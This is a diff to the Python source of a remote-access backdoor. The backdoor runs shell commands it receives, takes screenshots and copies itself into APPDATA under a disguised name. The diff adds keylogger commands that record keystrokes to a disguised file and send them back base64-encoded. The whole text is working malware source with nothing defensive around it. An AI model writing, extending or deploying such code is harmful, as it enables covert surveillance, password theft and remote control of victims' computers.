@@ -10,6 +10,8 @@ import sys
 import time
 import requests
 from mss import mss
+import threading
+import keylogger
 
 def screenshoot():
 	with  mss() as screenshot:
@@ -108,7 +110,13 @@ def shell():
 				relibale_send(admin.encode('utf-8'))
 			except:
 				relibale_send("cannot perform check".encode('utf-8'))
-		
+		elif command[:12] == "keylog_start":
+			th1 = threading.Thread(target=keylogger.start())
+			th1.start()
+		elif command[:11] == "keylogger_dump":
+			fn = open(keyLogger_path, "r")
+			relibale_send(base64.b64encode(fn.read()))
+
 		else:
 			try:
 				proc = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE,stdin=subprocess.PIPE)
@@ -117,6 +125,7 @@ def shell():
 			except Exception as e:
 				print(e)
 
+keyLogger_path = os.environ["appdata"] + "\\processmanager.txt"
 location = os.environ["appdata"] + "\\Avinashwindows32.exe"
 if not os.path.exists(location):
 	shutil.copyfile(sys.executable, location)
